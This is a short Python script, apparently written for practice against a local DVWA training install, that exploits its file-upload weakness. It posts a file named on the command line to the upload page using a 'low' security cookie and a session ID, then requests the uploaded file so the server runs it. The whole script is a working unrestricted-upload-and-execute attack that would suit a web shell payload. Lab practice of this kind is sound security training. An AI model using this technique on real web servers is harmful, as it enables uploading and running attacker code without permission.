import requests
import sys

file_name = sys.argv[1]

target = "http://localhost/DVWA/vulnerabilities/upload/" 
exec_url = "http://localhost/DVWA/hackable/uploads/{}".format(file_name)
params = {"MAX_FILE_SIZE": "100000", "uploaded": file_name, "Upload":"Upload"}
payload = {"uploaded": open(file_name,"r")}
cookie = {"security": "low", "PHPSESSID": "badjt1csq57jmfsn47g67jsbiv"}

req1 = requests.post(url=target, data=params, files=payload, cookies=cookie)
req2 = requests.get(url=exec_url, cookies=cookie)
